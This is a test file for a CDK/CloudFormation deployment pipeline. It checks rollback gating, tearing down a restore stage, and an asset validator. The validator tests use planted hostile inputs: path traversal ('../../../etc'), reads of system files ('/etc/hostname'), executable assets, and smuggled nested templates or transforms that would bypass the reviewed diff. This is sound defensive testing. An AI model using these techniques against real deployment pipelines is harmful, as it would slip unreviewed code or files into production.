    )
    const live = { stack: stack('UPDATE_ROLLBACK_FAILED', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all() }).said,
    ).toBe(refusal)
    for (const restore of ['up', 'down']) {
      expect(
        awsCheck({
          mode: 'restore',
          stage: 'restore',
          restore,
          release: release('B', D.B),
          stack: stuck,
          services: 'nocluster',
          running: D.B,
          ecr: all(),
        }).said,
        restore,
      ).toBe(refusal)
    }
  }, 30_000)

  it('refuses a rollback to what runs or to what isn’t strictly older, and a release off main', () => {
    expect(awsCheck({ mode: 'rollback', release: release('A', D.B), ...runsB(), ecr: all() }).said).toBe(
      'aws-check: the target is the release running now',
    )
    expect(awsCheck({ mode: 'rollback', release: release('C', D.C), ...runsB(), ecr: all() }).said).toBe(
      'aws-check: the target is not strictly older than the release running now',
    )
    expect(awsCheck({ mode: 'rollback', release: release('B', D.A), ...runsB(), ecr: all() }).verdict).toBe('refused')
    const offMain = { ...runsB(), stack: stack('UPDATE_COMPLETE', release('X', D.B)) }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...offMain }).said).toBe(
      "aws-check: what runs is not on main at this run's commit",
    )
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), stack: stack('UPDATE_COMPLETE', 'nope') })
        .said,
    ).toBe("aws-check: the Services stack's Release output is malformed")
  })

  it('rolls nothing back once another run has deployed since', () => {
    const since = { stack: stack('UPDATE_COMPLETE', release('A', D.A)), services: ONE, running: D.A }
    const auto = awsCheck({
      mode: 'auto',
      release: release('C', D.C),
      previous: release('B', D.B),
      ...since,
      ecr: all(),
    })
    expect(auto.verdict).toBe('rolled-false')
    expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
  })

  // ROLLBACK-02: the gate's previous release is the newest record when it read them; a rollback that landed
  // since, or a failed one, can leave an older release live, which the deploy then replaced. Going back to
  // the previous release would then move forward past it, so auto goes on only when the release the deploy
  // replaced is the previous one or a later one (or none, on a first deploy).
  it('rolls nothing back when the deploy replaced a release older than the previous one', () => {
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    const auto = (replaced: string) =>
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), replaced, ...live, ecr: all() })
    // Replaced older than the previous release (a rollback landed in between), off main, empty or malformed.
    for (const replaced of [release('A', D.A), release('X', D.A), '', 'nope']) {
      const stopped = auto(replaced)
      expect(stopped.verdict, replaced).toBe('rolled-false')
      expect(stopped.said, replaced).toContain(
        `not the previous release (${release('B', D.B)}) or a later one (a rollback, or a failed one, left an older release live after the gate read the records), so nothing is rolled back: dispatch mode=rollback (deploy-and-rollback.md)`,
      )
      expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
    }
    expect(auto(release('A', D.A)).said).toContain(`this run's deploy replaced ${release('A', D.A)}, not`)
    expect(auto('').said).toContain("this run's deploy replaced a release it never named, not")
    // The previous release itself, an earlier build of its commit, a later release (a re-run's own), or none.
    for (const replaced of [release('B', D.B), release('B', D.D), release('C', D.C), 'none']) {
      expect(auto(replaced).verdict, replaced).toBe('pass')
    }
  }, 30_000)

  it('outputs what a deploy or a drill replaced, for the rollback job', () => {
    const outputs = () => readFileSync(join(scratch, 'output'), 'utf8')
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB() }).verdict).toBe('pass')
    expect(outputs()).toBe(`go=true\nreplaced=${release('B', D.B)}\n`)
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    expect(awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none }).verdict).toBe('pass')
    expect(outputs()).toBe('go=true\nreplaced=none\n')
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(outputs()).toBe(`go=true\nreplaced=${release('B', D.B)}\n`)
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all() }).verdict).toBe('pass')
    expect(outputs()).toBe('go=true\n')
  })

  // ROLLBACK-01: a later run can push, migrate past a floor the gate never read, then fail with Release
  // unchanged; a rollback then goes back only while every image in ECR is of this run's commit or older.
  it('rolls nothing back, and refuses a rollback, once a later commit than the run’s has pushed an image', () => {
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    const auto = (pushed: Answers['pushed']) =>
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.B), ...live, ecr: all(), pushed })
    for (const later of ['L', 'X'] as const) {
      const stopped = auto(['A', later, 'B', 'C'])
      expect(stopped.verdict).toBe('rolled-false')
      expect(stopped.said).toContain(`aws-check: auto: a later commit (${c[later]}) pushed an image`)
      expect(readFileSync(join(scratch, 'output'), 'utf8')).toBe('go=false\nrolled=false\n')
    }
    expect(auto(['A', 'B', 'C']).verdict).toBe('pass')
    expect(auto(['B']).verdict).toBe('pass')
    const rollback = (pushed: Answers['pushed']) =>
      awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: all(), pushed })
    expect(rollback(['A', 'B', 'C', 'L']).said).toBe(
      `aws-check: a later commit (${c.L}) pushed an image, so it may have migrated the database: check the floors at it (deploy-and-rollback.md)`,
    )
    expect(rollback(['A', 'B']).verdict).toBe('pass')
    // ECR's answer that isn't a list of tags can't be read, an empty one is a first deploy's alone, and
    // nothing moves.
    for (const raw of ['null', '"sha"', '{}']) {
      expect(rollback({ raw }).said, raw).toBe("aws-check: ECR's image tags can't be read")
      expect(auto({ raw }).verdict, raw).toBe('refused')
    }
    expect(rollback({ raw: '[]' }).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    expect(auto({ raw: '[]' }).verdict).toBe('refused')
  }, 30_000)

  // Round 2's ROLLBACK-01 and AWS-01: an older commit's deploy job (a re-run of an older run, or one GitHub's
  // queue for the group starts after a later one) must not push, move the stacks back or migrate over a later
  // commit's run that pushed, moved them and failed with Release unchanged; a drill neither.
  it('refuses a deploy or a drill once a later commit than the run’s has pushed an image', () => {
    const deploy = (pushed: Answers['pushed'], first = false) =>
      awsCheck({ mode: 'deploy', release: release('C', D.C), ...runsB(), first, pushed })
    for (const later of ['L', 'X'] as const) {
      expect(deploy(['A', 'B', later]).said, later).toBe(
        `aws-check: a later commit (${c[later]}) pushed an image, so it may have moved the stacks or migrated the database: dispatch again from main's head (deploy-and-rollback.md)`,
      )
      expect(
        awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: all(), pushed: ['B', later] }).said,
        later,
      ).toBe(
        `aws-check: a later commit (${c[later]}) pushed an image, so it may have moved the stacks or migrated the database: dispatch again from main's head (deploy-and-rollback.md)`,
      )
    }
    // Images of this run's commit (an earlier attempt's) and older ones pass.
    expect(deploy(['A', 'B', 'C']).verdict).toBe('pass')
    expect(deploy(['C']).verdict).toBe('pass')
    // ECR with no image is a first deploy's alone.
    const none = { stack: 'none', services: 'nocluster', running: D.B }
    expect(
      awsCheck({ mode: 'deploy', release: release('C', D.C), first: true, ...none, pushed: { raw: '[]' } }).verdict,
    ).toBe('pass')
    expect(deploy({ raw: '[]' }).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    expect(deploy({ raw: '[]' }, true).said).toBe('aws-check: ECR holds no image, which only a first deploy may find')
    // A restore deploys only the restore stage's own stacks, so a later image doesn't stop it.
    expect(
      awsCheck({
        mode: 'restore',
        stage: 'restore',
        restore: 'down',
        release: release('B', D.B),
        ...runsB(),
        services: 'nocluster',
        ecr: all(),
        pushed: ['L'],
      }).verdict,
    ).toBe('pass')
  }, 30_000)

  it('reads prod’s Release for a restore, never the restore stage’s own stacks', () => {
    const restore = { mode: 'restore' as const, stage: 'restore', services: 'nocluster', running: D.B, ecr: all() }
    const elsewhere = stack('UPDATE_COMPLETE', release('C', D.C))
    for (const up of [undefined, 'up']) {
      expect(awsCheck({ ...restore, restore: up, release: release('B', D.B), stack: elsewhere }).said).toBe(
        'aws-check: what runs is not the release the gate read',
      )
    }
    expect(awsCheck({ ...restore, release: release('B', D.B), stack: 'none' }).verdict).toBe('refused')
    // ROLLBACK-07: down takes only the restore stage's own stacks down, so it compares no release of
    // prod's, but still waits while prod's Services stack moves.
    expect(awsCheck({ ...restore, restore: 'down', release: release('B', D.B), stack: elsewhere }).verdict).toBe('pass')
    expect(
      awsCheck({
        ...restore,
        restore: 'down',
        release: release('B', D.B),
        stack: stack('UPDATE_IN_PROGRESS', release('C', D.C)),
      }).said,
    ).toBe('aws-check: a deployment is in progress: wait for it to settle, then dispatch again')
  })

  it('refuses a recorded digest ECR doesn’t hold under its own commit’s tag', () => {
    const wrongTag = tags([[D.A, 'B']])
    expect(awsCheck({ mode: 'rollback', release: release('A', D.A), ...runsB(), ecr: wrongTag }).said).toBe(
      "aws-check: ECR holds no image of the release under its commit's tag",
    )
    expect(awsCheck({ mode: 'drill', release: release('B', D.B), ...runsB(), ecr: '{}' }).verdict).toBe('refused')
    const live = { stack: stack('UPDATE_COMPLETE', release('C', D.C)), services: ONE, running: D.C }
    expect(
      awsCheck({ mode: 'auto', release: release('C', D.C), previous: release('B', D.D), ...live, ecr: all() }).said,
    ).toBe("aws-check: ECR holds no image of the previous release under its commit's tag")
  })
})

// restore=down (C11-D45; T24 item 18) and the prod job's read-back after it, each step's run taken from
// deploy.yml and run with bash and jq against a stand-in aws and CLI (ROLLBACK-04): down skips a restore
// stack a failed create left (ROLLBACK_COMPLETE or REVIEW_IN_PROGRESS) and refuses one still moving, and
// the read-back reads a Services stack so left as the release it was given, never as a refusal.
describe('DPW-06 (C11-D45): restore=down and its read-back against planted AWS answers', () => {
  let scratch = ''
  beforeAll(() => {
    scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw06-down-'))
    const bin = join(scratch, 'aws-cdk', 'package', 'bin')
    execFileSync('mkdir', ['-p', bin])
    writeFileSync(join(bin, 'cdk'), '#!/bin/bash\necho "$1 $4" >>"$CDK_LOG"\n', { mode: 0o755 })
  })
  afterAll(() => {
    if (scratch !== '') rmSync(scratch, { recursive: true, force: true })
  })
  const runOf = (name: string) => {
    const prod = workflowJobs(deployText).find(each => each.id === 'prod')
    const run = (prod === undefined ? [] : parsedSteps(prod)).find(step => step.name === name)?.run
    if (run === undefined) throw new Error(`no step ${name} in prod`)
    return run
  }
  const RELEASE = `${'c'.repeat(40)}:sha256:${'0'.repeat(64)}`
  // The stand-in aws: STATUS_<Part> is each restore stack's status (none: it doesn't exist), SERVICES_STACK
  // the Services stack's status and Release as the read-back asks, and the restore cluster is gone.
  const STUB = `aws() {
  case "$1 $2" in
    'cloudformation describe-stacks')
      local part=\${4##*-} value
      if [[ "$6" == *StackStatus,* ]]; then value=$SERVICES_STACK; else value=$(eval "printf '%s' \\"\\\${STATUS_$part}\\"") ; fi
      if [ "$value" = none ]; then
        echo "An error occurred (ValidationError) when calling the DescribeStacks operation: Stack with id $4 does not exist" >&2
        return 254
      fi
      printf '%s\\n' "$value" ;;
    'ecs describe-services')
      echo 'An error occurred (ClusterNotFoundException) when calling the DescribeServices operation: Cluster not found.' >&2
      return 254 ;;
    *) echo "unexpected aws $*" >&2; return 99 ;;
  esac
}`
  function step(name: string, env: Record<string, string>) {
    const output = join(scratch, 'output')
    const log = join(scratch, 'cdk.log')
    writeFileSync(output, '')
    writeFileSync(log, '')
    const result = spawnSync('bash', ['-c', `${STUB}\n${runOf(name)}`], {
      encoding: 'utf8',
      env: {
        PATH: process.env.PATH ?? '',
        HOME: scratch,
        TMPDIR: scratch,
        GITHUB_WORKSPACE: join(scratch, 'workspace'),
        GITHUB_OUTPUT: output,
        GITHUB_STEP_SUMMARY: join(scratch, 'summary'),
        RUNNER_TEMP: scratch,
        CDK_LOG: log,
        STAGE: 'restore',
        RELEASE,
        MODE: 'deploy',
        RESTORE: 'down',
        STATUS_Services: 'UPDATE_COMPLETE',
        STATUS_Data: 'UPDATE_COMPLETE',
        STATUS_Platform: 'UPDATE_COMPLETE',
        SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', RELEASE]),
        ...env,
      },
    })
    return {
      status: result.status,
      said: result.stdout.trim().split('\n').at(-1) ?? '',
      deployed: readFileSync(log, 'utf8').trim().split('\n').filter(Boolean),
      output: readFileSync(output, 'utf8'),
    }
  }
  const down = (env: Record<string, string>) => step('Take the restore stage down', env)
  const readBack = (env: Record<string, string>) => step('Read back what runs', env)

  it('takes each settled stack down in order, and skips one a failed create left or that doesn’t exist', () => {
    expect(down({}).deployed).toEqual(['deploy restore/Services', 'deploy restore/Data', 'deploy restore/Platform'])
    for (const left of ['ROLLBACK_COMPLETE', 'REVIEW_IN_PROGRESS', 'none']) {
      const after = down({ STATUS_Services: left })
      expect(after.status, left).toBe(0)
      expect(after.deployed, left).toEqual(['deploy restore/Data', 'deploy restore/Platform'])
    }
    expect(down({ STATUS_Data: 'REVIEW_IN_PROGRESS', STATUS_Platform: 'ROLLBACK_COMPLETE' }).deployed).toEqual([
      'deploy restore/Services',
    ])
    // Round 2's ROLLBACK-03 and AWS-02: a stack whose failed create couldn't roll back (which the CLI would
    // delete and create again, and whose delete termination protection refuses) is skipped, the others are
    // still taken down, and the step then fails, naming each such stack.
    const kept = down({ STATUS_Data: 'ROLLBACK_FAILED' })
    expect(kept.status).toBe(1)
    expect(kept.deployed).toEqual(['deploy restore/Services', 'deploy restore/Platform'])
    expect(kept.said).toBe(
      "restore down: the restore stage isn't down: tier 2 deletes Hearth-restore-Data (deploy-and-rollback.md)",
    )
    const both = down({ STATUS_Services: 'ROLLBACK_FAILED', STATUS_Platform: 'ROLLBACK_FAILED' })
    expect(both.status).toBe(1)
    expect(both.deployed).toEqual(['deploy restore/Data'])
    expect(both.said).toBe(
      "restore down: the restore stage isn't down: tier 2 deletes Hearth-restore-Services Hearth-restore-Platform (deploy-and-rollback.md)",
    )
    const moving = down({ STATUS_Data: 'UPDATE_IN_PROGRESS' })
    expect(moving.status).toBe(1)
    expect(moving.said).toBe(
      'restore down: Hearth-restore-Data is UPDATE_IN_PROGRESS: wait for it to settle, then dispatch again',
    )
    expect(moving.deployed).toEqual(['deploy restore/Services'])
  })

  it('reads a restore Services stack a failed create left as the release down was given, and nothing else', () => {
    for (const left of [
      JSON.stringify(['ROLLBACK_COMPLETE', null]),
      JSON.stringify(['REVIEW_IN_PROGRESS', null]),
      'none',
    ]) {
      const after = readBack({ SERVICES_STACK: left })
      expect(after.status, left).toBe(0)
      expect(after.output, left).toContain(`deployed=${RELEASE}\n`)
      expect(after.output, left).toContain('services={}\n')
    }
    const other = `${'d'.repeat(40)}:sha256:${'1'.repeat(64)}`
    expect(readBack({ SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', other]) }).output).toContain(
      `deployed=${other}\n`,
    )
    // A stack with no Release is a refusal anywhere but restore=down, and a malformed one is a refusal always.
    const refused = "read-back: Hearth-restore-Services' Release isn't <commit>:<digest>"
    expect(readBack({ RESTORE: 'up', SERVICES_STACK: JSON.stringify(['ROLLBACK_COMPLETE', null]) })).toMatchObject({
      status: 1,
      said: refused,
    })
    expect(readBack({ SERVICES_STACK: JSON.stringify(['UPDATE_COMPLETE', null]) })).toMatchObject({
      status: 1,
      said: refused,
    })
    expect(readBack({ SERVICES_STACK: JSON.stringify(['ROLLBACK_COMPLETE', 'None']) })).toMatchObject({
      status: 1,
      said: refused,
    })
  })
})

// ASSET_CHECK itself (DPW-14), run with bash and jq on copies of the workload's own assembly,
// synthesised in process by infra's helper (CI's check runs the tests before synth:ci, and cdk.out isn't
// committed): the real layout passes, and each planted breakage is refused with one line naming its rule.
describe('DPW-14 (C11-D76): ASSET_CHECK on planted assemblies', () => {
  const RELEASE = `${'f'.repeat(40)}:sha256:${'0'.repeat(64)}`
  let source = ''
  const made: string[] = []
  beforeAll(() => {
    source = synthWorkload().synthesised.outdir
  }, 120_000)
  afterAll(() => {
    for (const folder of made) rmSync(folder, { recursive: true, force: true })
  })
  const read = (path: string) => JSON.parse(readFileSync(path, 'utf8')) as Record<string, unknown>
  const write = (path: string, value: unknown) => writeFileSync(path, JSON.stringify(value))
  const edit = (path: string, change: (json: Record<string, unknown>) => void) => {
    const json = read(path)
    change(json)
    write(path, json)
  }
  const named = (dir: string, part: string, suffix: string) => {
    const name = readdirSync(dir).find(each => each.includes(part) && each.endsWith(suffix))
    if (name === undefined) throw new Error(`no ${part}${suffix} in the assembly`)
    return join(dir, name)
  }
  type Artifact = {
    type?: string
    properties?: Record<string, unknown>
    metadata?: unknown
    additionalMetadataFile?: string
  }
  const artifacts = (json: Record<string, unknown>) => (json.artifacts ?? {}) as Record<string, Artifact>
  const files = (json: Record<string, unknown>) =>
    Object.values((json.files ?? {}) as Record<string, { source: Record<string, unknown> }>)
  // Sets one field of every file asset's source in an asset manifest.
  const setSources = (json: Record<string, unknown>, change: (source: Record<string, unknown>) => void) => {
    for (const file of files(json)) change(file.source)
  }
  const ENTRY = {
    type: 'aws:cdk:asset',
    data: { packaging: 'container-image', path: 'asset.x', id: 'x', sourceHash: 'x' },
  }

  function check(plant: (dir: string) => void, release = RELEASE): string {
    const dir = mkdtempSync(join(tmpdir(), 'hearth-dpw14-'))
    made.push(dir)
    cpSync(source, dir, { recursive: true })
    plant(dir)
    const result = spawnSync(
      'bash',
      ['-c', `set -euo pipefail\n${ASSET_CHECK}\ncheck_assembly "$1"\ncheck_release_in "$1" "$2"`, '_', dir, release],
      { encoding: 'utf8' },
    )
    const said = `${result.stdout}${result.stderr}`.trim()
    return result.status === 0 ? `passed${said === '' ? '' : `: ${said}`}` : said
  }
  const refused = (rule: string) => `asset-check: ${rule}`
  const RUNS = refused('a file asset runs a command, is packaged otherwise than file or zip, or names no relative path')
  const PLAIN = refused('a manifest names a file that is not a plain name in its own folder')
  const LEGACY = refused('an artifact carries a legacy asset entry, which the CLI would build or upload')
  const TEMPLATE = refused(
    "a stack's name isn't Hearth- and its stage's id, or the template CloudFormation is handed isn't its own templateFile",
  )
  const DESTINATION = refused(
    "a file asset's one destination isn't the staging bucket, its region and its publishing role as the synth spells them, at a key of 64 hex digits that ends as its packaging does, or a file asset isn't a plain name in its own folder",
  )
  const KEY = refused("a file asset's key isn't the sha256 of its bytes")
  const FACTS = refused(
    "a stack's or an asset manifest's deploy facts aren't the workload synth's: its environment, roles and bootstrap version, termination protection on Platform and Data alone, and no topic, tag, parameter or other property",
  )
  const nonprod = (dir: string) => join(dir, 'assembly-nonprod')
  const prod = (dir: string) => join(dir, 'assembly-prod')
  type Entry = { source: Record<string, unknown>; destinations: Record<string, Record<string, unknown>> }
  const entries = (json: Record<string, unknown>) => Object.values((json.files ?? {}) as Record<string, Entry>)
  const keyOf = (path: string) => `${createHash('sha256').update(readFileSync(path)).digest('hex')}.json`
  const BUCKET = `cdk-hearthapp-assets-\${AWS::AccountId}-ap-southeast-1`
  // Re-keys a stack's template asset after a plant edits its template, as the synth would (the key is the
  // sha256 of the template's bytes), so the check reaches the rule the plant is for.
  const rekey = (folder: string, part: string) => {
    const template = named(folder, part, '.template.json')
    const file = template.slice(folder.length + 1)
    const key = keyOf(template)
    edit(named(folder, part, '.assets.json'), json => {
      for (const entry of entries(json))
        if (entry.source.path === file)
          for (const destination of Object.values(entry.destinations)) destination.objectKey = key
    })
    edit(join(folder, 'manifest.json'), json => {
      for (const artifact of Object.values(artifacts(json)))
        if (artifact.properties?.templateFile === file)
          artifact.properties.stackTemplateAssetObjectUrl = `s3://${BUCKET}/${key}`
    })
  }

  it('passes the real layout: a root manifest, three nested assemblies and the root asset folder', () => {
    expect(readdirSync(source)).toEqual(
      expect.arrayContaining(['manifest.json', 'assembly-nonprod', 'assembly-prod', 'assembly-restore']),
    )
    expect(readdirSync(source).some(name => name.startsWith('asset.'))).toBe(true)
    expect(check(() => {})).toBe('passed')
  }, 30_000)

  it('refuses each planted breakage of the assets, with one line naming its rule', () => {
    const executable = (path: string) =>
      edit(path, json =>
        setSources(json, source => {
          source.executable = ['true']
        }),
      )
    expect(check(dir => executable(named(nonprod(dir), 'Data', '.assets.json')))).toBe(RUNS)
    expect(
      check(dir =>
        edit(
          named(prod(dir), 'Data', '.assets.json'),
          json => (json.dockerImages = { a: { source: { directory: '.' } } }),
        ),
      ),
    ).toBe(refused('an asset manifest holds a container image asset'))
    expect(
      check(dir => {
        const assets = named(nonprod(dir), 'Data', '.assets.json')
        const json = read(assets)
        setSources(json, source => {
          source.executable = ['true']
        })
        write(join(nonprod(dir), 'x.json'), json)
        edit(join(nonprod(dir), 'manifest.json'), manifest => {
          for (const artifact of Object.values(artifacts(manifest))) {
            if (artifact.properties?.file === assets.slice(nonprod(dir).length + 1)) artifact.properties.file = 'x.json'
          }
        })
      }),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.packaging = 'container-image'
          }),
        ),
      ),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.path = '/etc/hostname'
          }),
        ),
      ),
    ).toBe(RUNS)
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Platform', '.assets.json'), json =>
          setSources(json, source => {
            source.path = '../../../etc'
          }),
        ),
      ),
    ).toBe(refused('an asset path leaves the assembly'))
    // No asset manifest at all: with the stacks they upload gone too, and with the stacks left, whose templates
    // then nothing uploads.
    const without =
      (...types: string[]) =>
      (dir: string) => {
        for (const folder of [dir, nonprod(dir), prod(dir), join(dir, 'assembly-restore')]) {
          edit(join(folder, 'manifest.json'), json => {
            json.artifacts = Object.fromEntries(
              Object.entries(artifacts(json)).filter(([, artifact]) => !types.includes(artifact.type ?? '')),
            )
          })
        }
      }
    expect(check(without('cdk:asset-manifest', 'aws:cloudformation:stack'))).toBe(refused('no asset manifest was read'))
    expect(check(without('cdk:asset-manifest'))).toBe(TEMPLATE)
  }, 30_000)

  // FLOW-A1-01 and A1-02: the CLI hands CloudFormation the object a stack's stackTemplateAssetObjectUrl names,
  // which its asset manifests upload, never the templateFile the release check reads and the approver's diff
  // shows; and it names a stack with no stackName by its artifact's id, and reads a file name raw, where the
  // release check read both through @tsv. So each stack's template object is uploaded from its own
  // templateFile alone, its name is Hearth- and its stage's id, and a file name is letters, digits, dots,
  // dashes and underscores.
  it('refuses a template CloudFormation would be handed other than the one checked, and a stack named otherwise (FLOW-A1-01, A1-02)', () => {
    const stacks = (dir: string, change: (artifact: Artifact & { displayName?: string }) => void) =>
      edit(join(dir, 'manifest.json'), json => {
        for (const artifact of Object.values(artifacts(json)))
          if (
            artifact.type === 'aws:cloudformation:stack' &&
            artifact.properties?.stackName === 'Hearth-nonprod-Services'
          )
            change(artifact)
      })
    const template = (dir: string) => named(nonprod(dir), 'Services', '.template.json')
    const assets = (dir: string) => named(nonprod(dir), 'Services', '.assets.json')
    // Plant D: the template asset uploads another plain file in the same folder.
    expect(
      check(dir => {
        cpSync(template(dir), join(nonprod(dir), 'deployed.json'))
        edit(assets(dir), json => {
          for (const entry of entries(json)) if (entry.source.packaging === 'file') entry.source.path = 'deployed.json'
        })
      }),
    ).toBe(TEMPLATE)
    // A second asset on the template's key, from another file (whose bytes aren't the key's), and from a copy
    // of the template (whose are, but which isn't the stack's templateFile).
    const second = (path: string) => (dir: string) =>
      edit(assets(dir), json => {
        const [first] = entries(json)
        if (first !== undefined)
          (json.files as Record<string, unknown>).second = { ...first, source: { path, packaging: 'file' } }
      })
    expect(check(second('tree.json'))).toBe(KEY)
    expect(
      check(dir => {
        cpSync(template(dir), join(nonprod(dir), 'copy.json'))
        second('copy.json')(dir)
      }),
    ).toBe(TEMPLATE)
    // The template uploaded as a zip (a .json key no zip has), a URL naming no asset's key and one that isn't
    // s3; and no URL at all, which is no longer the synth's set of properties.
    expect(
      check(dir =>
        edit(assets(dir), json => {
          for (const entry of entries(json)) entry.source.packaging = 'zip'
        }),
      ),
    ).toBe(DESTINATION)
    for (const [url, rule] of [
      [`s3://${BUCKET}/other.json`, TEMPLATE],
      ['https://example.invalid/t.json', TEMPLATE],
      [undefined, FACTS],
    ] as const) {
      expect(
        check(dir =>
          stacks(nonprod(dir), artifact => {
            if (artifact.properties !== undefined) artifact.properties.stackTemplateAssetObjectUrl = url
          }),
        ),
        String(url),
      ).toBe(rule)
    }
    // Plant A: no stackName, which the CLI would take from the artifact's id (no longer the synth's set of
    // properties); a name that isn't the stage's id; and no displayName.
    for (const [change, rule] of [
      [
        (artifact: Artifact & { displayName?: string }) => {
          if (artifact.properties !== undefined) delete artifact.properties.stackName
        },
        FACTS,
      ],
      [
        (artifact: Artifact & { displayName?: string }) => {
          if (artifact.properties !== undefined) artifact.properties.stackName = 'Hearth-nonprod-Tasks'
        },
        TEMPLATE,
      ],
      [
        (artifact: Artifact & { displayName?: string }) => {
          delete artifact.displayName
        },
        TEMPLATE,
      ],
    ] as const) {
      expect(check(dir => stacks(nonprod(dir), change))).toBe(rule)
    }
    // Plant B: a backslash in a file name, which @tsv would double; and a space.
    for (const name of ['S\\x.template.json', 'S x.template.json']) {
      expect(
        check(dir =>
          stacks(nonprod(dir), artifact => {
            if (artifact.properties !== undefined) artifact.properties.templateFile = name
          }),
        ),
        name,
      ).toBe(PLAIN)
    }
  }, 60_000)

  // Round 5's fourth attack (FLOW-A4-01). A template can hand CloudFormation another template by reference:
  // a nested stack's TemplateURL names an object the asset manifests upload, while the CLI's diff reads the
  // file its aws:asset:path names (any file ../ reaches) and the release check reads neither. A stack set, a
  // Service Catalog product, a transform (a macro, SAM, AWS::Include) and a module do the same, and a
  // registered type runs a handler no template shows. So a template holds CloudFormation's own sections
  // alone, no Transform or Fn::Transform, and resource types of AWS's own (the VPC's default-group custom
  // resource aside) outside CloudFormation's, SAM's and Service Catalog's, in any letter case.
  it('refuses a template that hands CloudFormation a template or a handler the diff and release check never read (FLOW-A4-01)', () => {
    const HANDS = refused(
      'a template holds a section, a transform or a resource type a workload synth never writes, which hands CloudFormation a template or a handler the diff and the release check never read',
    )
    const planted = (change: (template: Record<string, unknown>) => void) => (dir: string) => {
      edit(named(nonprod(dir), 'Services', '.template.json'), change)
      rekey(nonprod(dir), 'Services')
    }
    const resource = (value: unknown) =>
      planted(template => {
        const resources = template.Resources as Record<string, unknown>
        resources.Extra = value
      })
    const nested = (path: string) => ({
      Type: 'AWS::CloudFormation::Stack',
      Properties: { TemplateURL: `https://s3.ap-southeast-1.amazonaws.com/${BUCKET}/${'a'.repeat(64)}.json` },
      Metadata: { 'aws:asset:path': path },
    })
    // The layout re-keyed alone passes, and so does a resource of AWS's own the synth doesn't write today,
    // so each refusal below is its plant's.
    expect(check(planted(() => {}))).toBe('passed')
    expect(check(resource({ Type: 'AWS::SSM::Parameter', Properties: { Type: 'String', Value: 'x' } }))).toBe('passed')
    for (const [plant, label] of [
      [
        resource(nested('nonprodServicesExtra.nested.template.json')),
        'a nested stack whose metadata names another file',
      ],
      [resource(nested('../../outside.json')), 'a nested stack whose metadata names a file outside the assembly'],
      [resource({ Type: 'AWS::Cloudformation::Stack', Properties: {} }), 'a nested stack in another letter case'],
      [resource({ Type: 'AWS::CloudFormation::StackSet', Properties: {} }), 'a stack set'],
      [resource({ Type: 'AWS::CloudFormation::Macro', Properties: {} }), 'a macro'],
      [resource({ Type: 'AWS::CloudFormation::CustomResource', Properties: {} }), 'a custom resource'],
      [resource({ Type: 'Custom::Other', Properties: {} }), 'another custom resource'],
      [resource({ Type: 'AWS::Serverless::Application', Properties: {} }), 'a SAM application'],
      [resource({ Type: 'AWS::ServiceCatalog::CloudFormationProvisionedProduct', Properties: {} }), 'a product'],
      [resource({ Type: 'Hearth::Plant::Thing::MODULE', Properties: {} }), 'a module'],
      [resource({ Type: 'Hearth::Plant::Thing', Properties: {} }), 'a registered type'],
      [resource({ Properties: {} }), 'a resource with no type'],
      [resource('x'), 'a resource that is not an object'],
      [
        planted(template => {
          template.Transform = 'AWS::Serverless-2016-10-31'
        }),
        'a top-level Transform',
      ],
      [
        resource({
          Type: 'AWS::SSM::Parameter',
          Properties: {
            Type: 'String',
            Value: { 'Fn::Transform': { Name: 'AWS::Include', Parameters: { Location: 'x' } } },
          },
        }),
        'an Fn::Transform',
      ],
      [
        planted(template => {
          template.Hooks = { Hook: { Type: 'AWS::CodeDeploy::BlueGreen' } }
        }),
        'a Hooks section',
      ],
      [
        planted(template => {
          template.Resources = []
        }),
        'Resources that are not an object',
      ],
    ] as const) {
      expect(check(plant), label).toBe(HANDS)
    }
  }, 120_000)

  // Round 5's second attack (COMMANDS-A2-01). The CLI publishes every asset of every stack it deploys,
  // resolves a destination's placeholders before it publishes, and uploads nothing to a key that already
  // holds an object; CloudFormation is handed the object at the template's key. So another stack's asset
  // that put another template at the Services template's key under another spelling of the bucket (P, and S
  // with the release and images kept), or an earlier run's asset at a key no stack named yet, which a later
  // run's template URL then names (Q1 then Q2), would be what CloudFormation deploys, while the approver's
  // diff and the release check read the templateFile. Every file asset therefore has one destination, the
  // staging bucket, its region and its publishing role as the synth spells them, at a key that is the
  // sha256 of its bytes (a file's) or 64 hex digits (a zip's), so the object at a template's key is that
  // template whoever put it there.
  it('holds every file asset to the staging bucket by one spelling, at a key of its own bytes (COMMANDS-A2-01)', () => {
    const OTHER = `${'1'.repeat(40)}:sha256:${'2'.repeat(64)}`
    // Another Services template in the stage's folder: another release and another image (P, Q), or the
    // release and images kept and one environment variable added to each container (S).
    const deployed = (folder: string, stealthy = false) => {
      const json = read(named(folder, 'Services', '.template.json'))
      const outputs = json.Outputs as Record<string, { Value: unknown }>
